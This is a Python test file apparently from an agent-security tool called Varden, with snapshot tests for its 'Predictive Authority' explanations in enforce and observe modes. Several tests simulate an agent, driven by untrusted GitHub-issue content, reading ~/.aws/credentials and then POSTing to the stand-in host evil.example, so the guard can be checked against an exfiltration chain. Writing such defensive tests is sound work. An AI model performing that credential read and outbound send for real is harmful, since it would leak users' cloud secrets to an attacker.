"""Snapshot / golden tests for Predictive Authority explanations."""

from __future__ import annotations

import re

from varden.models import Action
from tests.predictive_authority.helpers import fresh_engine, run_step, untrusted_meta


def _normalize(text: str) -> str:
    text = re.sub(r"res:[a-z_]+:[0-9a-f]{8,}", "res:TYPE:HASH", text)
    text = re.sub(r"prv_[0-9a-f]+", "prv_HASH", text)
    text = re.sub(r"elapsed_ms\":\s*[0-9.]+", 'elapsed_ms": 0', text)
    return text


def test_snapshot_counterfactual_enforce():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "snap-e"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta("github.issue"),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    _final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta("github.issue"),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    rendered = _normalize(result.explanation.render())
    assert "VARDEN PREDICTIVE AUTHORITY — COUNTERFACTUAL" in rendered
    assert "Existing decision: ALLOW" in rendered
    assert "Predictive recommendation:" in rendered
    assert "Final decision:" in rendered
    assert "AKIA" not in rendered


def test_snapshot_observe_mode_output():
    engine = fresh_engine(mode="observe", max_depth=4)
    tid = "snap-o"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    _final, result = run_step(
        engine,
        Action(
            type="http_request",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    rendered = result.explanation.render()
    assert "(observe mode)" in rendered
    assert "Final decision: ALLOW" in rendered


def test_snapshot_status_render():
    from varden.predictive_authority.cli import render_status
    from varden.predictive_authority.registry import get_authority_registry

    engine = fresh_engine(mode="observe")
    run_step(
        engine,
        Action(type="filesystem_read", tool="open", args={"args": ["README.md", "r"]}, trace_id="snap-s", tenant_id="t"),
    )
    reg = get_authority_registry()
    text = render_status("t:snap-s", reg.get("t:snap-s"), reg.budget("t:snap-s"), reg.last_explanation("t:snap-s"))
    assert "VARDEN PREDICTIVE AUTHORITY" in text
    assert "confirmed" in text.lower()


def test_snapshot_budget_output():
    from varden.predictive_authority.config import PredictiveAuthorityConfig
    from varden.predictive_authority.engine import PredictiveAuthorityEngine
    from varden.predictive_authority.registry import reset_authority_registry

    reset_authority_registry()
    engine = PredictiveAuthorityEngine(
        PredictiveAuthorityConfig(enabled=True, mode="observe", max_depth=3, max_authority_units=50)
    )
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            trace_id="snap-b",
            tenant_id="t",
        ),
    )
    from varden.predictive_authority.registry import get_authority_registry

    budget = get_authority_registry().budget("t:snap-b")
    assert budget is not None
    payload = budget.to_dict()
    assert "derivation" in payload
    assert payload["enabled"] is True
